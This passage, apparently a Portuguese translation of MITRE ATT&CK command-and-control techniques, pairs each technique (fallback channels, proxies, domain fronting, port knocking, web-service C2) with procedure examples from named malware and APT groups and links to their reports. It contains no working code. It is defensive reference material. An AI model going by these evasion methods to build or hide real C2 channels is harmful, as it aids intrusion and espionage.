**Exemplo de procedimento:** A ComRAT pode usar criptografia SSL/TLS para seu canal C2 baseado em HTTP. A ComRAT usou criptografia de chave pública com anexos de e-mail criptografados RSA e AES para seu canal Gmail C2. 
          
**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf 
          
T1008 **Canais de recuo:** Os adversários podem usar canais de comunicação alternativos ou de recuo se o canal principal estiver comprometido ou inacessível, a fim de manter o comando e o controle confiáveis e evitar limites de transferência de dados.   
          
**Exemplo de procedimento:** O AppleSeed pode usar um segundo canal para C2 quando o canal principal estiver no modo de upload:  O backdoor do AppleSeed está usando uma estrutura de comando de duas camadas para se comunicar com seu servidor de comando e controle. Aqui está o padrão de URL usado para comunicações C&C:

entity:url url:?m=[command layer one]&p1=[volume serial number]&p2=[command layer two]
A camada de comando um define o tipo de comando que o servidor espera ser executado na vítima e pode ter um dos seguintes valores:
               
![image](https://user-images.githubusercontent.com/95362045/163864741-160c6959-07a3-4c71-8d0c-fdd47d1c16cc.png) 
          
A camada 2 do comando é apenas para quando a camada de comando 1 estiver no modo de dados de upload (c) e definir o tipo de upload. Ele pode ter um dos seguintes valores: 
          
![image](https://user-images.githubusercontent.com/95362045/163873902-90a6eb44-f1ec-47ba-b28d-6e7e139ad639.png)
          
**REFERÊNCIA:**  https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/ 
          
T1105 **Transferência de ferramentas de entrada:** Os adversários podem transferir ferramentas ou outros arquivos de um sistema externo para um ambiente comprometido. Os arquivos podem ser copiados de um sistema controlado por adversário externo através do canal de comando e controle para trazer ferramentas para a rede da vítima ou através de protocolos alternativos com outra ferramenta, como FTP. 
          
**Exemplo de procedimento:** Agente Tesla pode baixar arquivos adicionais para execução na máquina da vítima: uma vulnerabilidade de execução remota de código em várias versões do Microsoft Office — para baixar e abrir um documento RTF de dentro de um arquivo DOCX malicioso 
          
**REFERÊNCIA:**  https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html
          
T1104 **Canais multi-estágio:** Os adversários podem criar vários estágios para comando e controle que são empregados em diferentes condições ou para determinadas funções. O uso de múltiplas etapas pode ofuscar o canal de comando e controle para dificultar a detecção.
          
**Exemplp de procedimento:** O BLACKCOFFEE usa o portal TechNet Web da Microsoft para obter uma tag codificada contendo o endereço IP de um servidor de comando e controle e, em seguida, comunica-se separadamente com esse endereço IP para C2. Se o servidor C2 for descoberto ou desligado, os atores de ameaças poderão atualizar o endereço IP codificado no TechNet para manter o controle das máquinas das vítimas. 
          
**REFERÊNCIA:**  https://www2.fireeye.com/rs/fireye/images/APT17_Report.pdf 
          
T1095 **Protocolo de camada de não-aplicação:**   Os adversários podem usar um protocolo de camada não-aplicativo para comunicação entre host e servidor C2 ou entre hosts infectados dentro de uma rede. A lista de possíveis protocolos é extensa.        
          
**Exemplo de procedimento:** Anchor tem usado ICMP em comunicações C2: Esta nova variante funciona como um backdoor sofisticado e furtivo que escolhe seletivamente alvos de alto perfil. Anchor_DNS ainda está passando por ciclos rápidos de desenvolvimento com alterações de código e novas atualizações de recursos a cada poucas semanas.
          
Esta é uma nova variante de Anchor_DNS que apareceu já em novembro de 2019 e exibe as seguintes mudanças de código e comportamento:

- Nenhum mecanismo de auto-exclusão mostrado em amostras anteriores
- Sem verificações de conectividade à internet usando serviços web online legítimos
- Um recurso integrado para verificar a disponibilidade de C2 usando ICMP (ping)
- Criptografia parcial adicional de sequência e ofuscação de código 
          
**REFERÊNCIA:** https://www.cybereason.com/blog/research/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 
          
T1571 **Porta não padrão:**  Os adversários podem se comunicar usando um protocolo e paring de portas que normalmente não estão associados. Por exemplo, HTTPS sobre a porta 8088 ou porta 587 em oposição ao porto tradicional 443. Os adversários podem fazer alterações na porta padrão usada por um protocolo para contornar a filtragem ou a análise/análise de dados de rede. 
          
**Exemplo de procedimento:** O Cobalt Strike usa um protocolo de comando e controle personalizado que é encapsulado em HTTP, HTTPS ou DNS. Além disso, ele realiza comunicação peer-to-peer sobre o Windows, com os tubos encapsulados no protocolo SMB. Todos os protocolos usam suas portas padrão atribuídas.
          
**REFERÊNCIA:** https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf 
          
T1090 **Procuração:** Os adversários podem usar um proxy de conexão para direcionar o tráfego de rede entre sistemas ou atuar como um intermediário para comunicações de rede para um servidor de comando e controle para evitar conexões diretas à sua infraestrutura. Existem muitas ferramentas que permitem o redirecionamento do tráfego através de proxies ou redirecionamento de portas, incluindo HTRAN, ZXProxy e ZXPortMap.
          
**Exemplo de procedimento:** AuditCred pode utilizar proxy para comunicações. 

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/18/k/lazarus-continues-heists-mounts-attacks-on-financial-organizations-in-latin-america.html
          
.001 **Proxy Interno:** Os adversários podem usar um proxy interno para direcionar o tráfego de comando e controle entre dois ou mais sistemas em um ambiente comprometido
          
**Exemplo de procedimento:** A Strider tem usado servidores locais com acesso à rede local e à Internet para atuar como nós proxy internos para exfiltrar dados de outras partes da rede sem acesso direto à Internet 
          
**REFERÊNCIA:** https://securelist.com/faq-the-projectsauron-apt/75533/
          
.002 **Proxy externo:** Os adversários podem usar um proxy externo para atuar como um intermediário para comunicações de rede para um servidor de comando e controle para evitar conexões diretas com sua infraestrutura.
          
**Exemplo de procedimento:** O APT28 usou outras vítimas como proxies para retransmitir o tráfego de comando, por exemplo, usando um servidor de e-mail militar georgiano comprometido como ponto de partida para as vítimas da OTAN. O grupo também usou uma ferramenta que age como um proxy para permitir c2 mesmo que a vítima esteja atrás de um roteador. O APT28 também usou uma máquina para retransmitir e obscurecer as comunicações entre o CHOPSTICK e seu servidor
          
**REFERÊNCIA:** https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf
          
.003 **Multi-hop Proxy:**  Para disfarçar a fonte do tráfego malicioso, os adversários podem acorrentar vários proxies. Normalmente, um defensor será capaz de identificar o último tráfego proxy atravessado antes de entrar em sua rede; o defensor pode ou não ser capaz de identificar quaisquer proxies anteriores antes do proxy de último salto.  
          
**Exemplo de procedimento:** Um backdoor usado pelo APT29 criou um serviço oculto do Tor para encaminhar o tráfego do cliente Tor para as portas locais 3389 (RDP), 139 (Netbios) e 445 (SMB) permitindo acesso remoto total de fora da rede.
          
**REFERÊNCIA:**  https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016
          
.004 **Fronting de domínio:**  Os adversários podem aproveitar esquemas de roteamento em CDNs (Content Delivery Networks, redes de entrega de conteúdo) e outros serviços que hospedam vários domínios para ofuscar o destino pretendido de tráfego HTTPS ou tráfego encapsulado através de HTTPS. 
          
**Exemplo de procedimento:** O SMOKEDHAM usou um domínio frontal para ofuscar seu domínio de servidor C2 codificado: SMOKEDHAM se comunica com seu servidor C2 usando HTTPS. O backdoor usa fronting de domínio para ofuscar seu verdadeiro servidor C2. O domínio frontal é configurado por um estágio anterior de execução e o domínio real é codificado em termos rígidos no backdoor.
          
**REFERÊNCIA:** https://www.mandiant.com/resources/darkside-affiliate-supply-chain-software-compromise 
          
T1229 **Software de acesso remoto:** Um adversário pode usar suporte legítimo à área de trabalho e software de acesso remoto, como Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, para estabelecer um canal interativo de comando e controle para direcionar sistemas dentro de redes. 
          
**Exemplo de procedimento:**  Dridex contém um módulo para VNC: O malware Dridex tem quatro componentes principais:   
          
- Loader — baixa o módulo principal e uma lista inicial de nó para se juntar à rede P2P
- Módulo principal — executa as funções principais do malware (coleta de credenciais, realização de ataques man-in-the-browser usando injeções da Web, download dos - - módulos VNC e backconnect, etc.)
- Módulo VNC — permite que o invasor visualize remotamente e controle o computador da vítima
- Módulo de conexão traseira — permite que o invasor túnel tráfego de rede através do computador da vítima
          
 **REFERÊNCIA:** https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation 
          
 T1205 **Sinalização de tráfego:** Os adversários podem usar a sinalização de tráfego para ocultar portas abertas ou outras funcionalidades maliciosas usadas para persistência ou comando e controle. A sinalização de tráfego envolve o uso de um valor ou sequência mágica que deve ser enviado a um sistema para acionar uma resposta especial, como abrir uma porta fechada ou executar uma tarefa maliciosa.
          
**Exemplo de procedimento:** Ryuk usou wake-on-lan para ligar sistemas desligados para movimento lateral: O Ryuk Ransomware usa o recurso Wake-on-Lan para ativar dispositivos ligados em uma rede comprometida para ter maior sucesso criptografando-os. Wake-on-Lan é um recurso de hardware que permite que um dispositivo desligado seja acordado ou ligado, enviando um pacote de rede especial para ele. Isso é útil para administradores que podem precisar empurrar atualizações para um computador ou executar tarefas programadas quando ele é desligado.
          
**REFERÊNCIA:** https://www.bleepingcomputer.com/news/security/ryuk-ransomware-uses-wake-on-lan-to-encrypt-offline-devices/
          
**Exemplo de procedimento:** O PROMETHIUM usou um script que configura o serviço e o firewall para aceitar apenas conexões C2 de sistemas que usam uma sequência especificada de portas knock.
          
.001 **Port Knocking:** Os adversários podem usar a porta para ocultar portas abertas usadas para persistência ou comando e controle. Para habilitar uma porta, um adversário envia uma série de tentativas de conexões para uma sequência predefinida de portas fechadas.
          
**REFERêNCIA:** https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf
          
T1102 **Serviço Web:** Os adversários podem usar um serviço web externo existente e legítimo como um meio de transmitir dados de/de um sistema comprometido. Sites populares e mídias sociais agindo como um mecanismo para C2 podem dar uma quantidade significativa de cobertura devido à probabilidade de que os hosts dentro de uma rede já estejam se comunicando com eles antes de um compromisso.
          
**Exemplo de procedimento:** O APT32 usou o Dropbox, Amazon S3 e Google Drive para hospedar downloads maliciosos: O botão SIGN IN continha um hiperlink para uma página nas contas hostname.gservice[.] comentários. Esta página foi para baixo não retornou conteúdo interessante em nenhum dos testes da Volexity. A Volexity acredita que esta página provavelmente deve ser usada para credenciais de phishing. O aparecimento da sobreposição e da URL para os vários botões mostrados acima são gerados de acordo com os dados do navegador do visitante. Uma olhada mais de perto no componente de entrega de carga do JavaScript é mostrada abaixo. Ele mostra os URLs de download de malware hospedados no Dropbox para usuários do Windows e os links de phishing idênticos para visitantes android e iOS.
          
![Uploading image.png…]()
          
**REFERÊNCIA:** https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/ 
          
.001 **Resolver de Gota Morta:**Os adversários podem usar um serviço web externo existente e legítimo para hospedar informações que apontam para infraestrutura adicional de comando e controle (C2). Os adversários podem postar conteúdo, conhecido como resolução de queda morta, em serviços da Web com domínios incorporados (e muitas vezes ofuscados/codificados) ou endereços IP. 
          
**Exemplo de procedimento:** O APT41 usou sites legítimos para C2 através de resolvedores de gotas mortas (DDR), incluindo GitHub, Pastebin e Microsoft TechNet.
          
**REFERÊNCIA:** O APT41 usou sites legítimos para C2 através de resolvedores de gotas mortas (DDR), incluindo GitHub, Pastebin e Microsoft TechNet. 
          
.002 **Comunicação Bidirecional:** Os adversários podem usar um serviço web externo existente e legítimo como um meio de enviar comandos e receber saída de um sistema comprometido pelo canal de serviço da Web.
          
 **Exemplo de procedimento:* O APT37 aproveita sites de redes sociais e plataformas em nuvem (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox e Box) para C2
          
 **REFERÊNCIA:** https://www2.fireeye.com/rs/848-DID-242/images/rpt_APT37.pdf
          
 .003 **Comunicação unidirecional:** Os adversários podem usar um serviço web externo existente e legítimo como meio de enviar comandos para um sistema comprometido sem receber saída de retorno pelo canal de serviço da Web
          
**Exemplo de procedimento:** A variante "tDiscoverer" do HAMMERTOSS estabelece um canal C2 baixando recursos de serviços da Web como Twitter e GitHub. Os binários HAMMERTOSS contêm um algoritmo que gera uma alça diferente do Twitter para que o malware verifique se há instruções todos os dias.
          
**REFERÊNCIA:** https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf
          
          
          
